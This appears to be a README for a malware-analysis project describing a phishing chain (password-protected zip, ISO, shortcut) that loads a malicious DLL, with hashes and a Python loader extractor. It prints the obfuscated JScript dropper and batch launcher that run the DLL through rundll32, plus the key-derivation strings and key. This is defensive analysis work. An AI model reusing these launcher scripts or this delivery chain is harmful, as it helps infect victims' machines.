# 5B54F57DBAA74FA589AFB2D26D6C6B39E0C2930BD88FEA3172556CE96B3EB959

## Loader extractor for sample tiddler.dat

SHA256: 5B54F57DBAA74FA589AFB2D26D6C6B39E0C2930BD88FEA3172556CE96B3EB959

SHA3-384: ad33f268a26d4ec762431f9601a24431cb37f16afa7859f61ce2702093803d45837a3629db92a64fd892a83a72ee8a98

SHA1: 4aa4e28cd07e218e45ec60942c53d82c3f50fea7

MD5: 7754a35deec807d757f79165ba17708d

Three days ago a friend of mine received a phishing e-mail with a link (https[:]//lynxus[.]com/usq/refeidpisnretse) containing a zip file protected by the password "U492". 

<img width="1262" alt="0" src="https://user-images.githubusercontent.com/15001354/193664727-69ee625c-3a4d-4eea-8e71-5e718b625086.png">

Inside the zip there is an ISO called Learn#7435.iso containing a shortcut to the following malicious script:

~~~
// observablyCleaned
var undisruptedPuzzles = "rund DllRegis";

// ShellExecute
var bridgeheadsLibels = new ActiveXObject("shell.application").shellexecute("assaulting\\redressingLamentations.cmd", undisruptedPuzzles, "", "open", 0);
~~~

<img width="1134" alt="1" src="https://user-images.githubusercontent.com/15001354/193664786-75664000-6658-4582-9d27-258bd18f9d39.png">


The script uses ActiveXObject in order to execute another script called redressingLamentations.cmd (in the ISO) by passing the arguments "rund" and "DllRegis". 

Following the redressingLamentations.cmd script:

~~~
@echo off

	set a=ll
	set e=32

	:: tankageLicentiously
	%1%a%%e% assaulting\tiddler.dat,%2terServer

exit
~~~

It runs the command rundll32 assaulting\tiddler.dat,DllRegisterServer in order to start the malicious DLL.

After a bit of analysis, I wrote this simple script to extract the loader in order to practice a bit with python. 
The two strings used to generate the key are taken dynamically, the shellcode is taken dynamically by using the size offset that is hardcoded.
I'll try to write the second stage DLL extractor.

The malicious DLL was uploaded to [Malware Bazaar](https://bazaar.abuse.ch/sample/5b54f57dbaa74fa589afb2d26d6c6b39e0c2930bd88fea3172556ce96b3eb959/) by JAMESWT_MHT.


These two strings are used to generate the key:

* ewZOSoNXdJTjGtfGFtJwDGnslgItKrqSOoXTBEUIeNsATwlqubQMeKZByuBEOxjyadypZOaxQyRosZjVcChW
* gjdhkdfgkjsdghfkjsdhkjslfdghsdkjl

The key is:

* 7fafab656017bf33b9606982e6a6f277

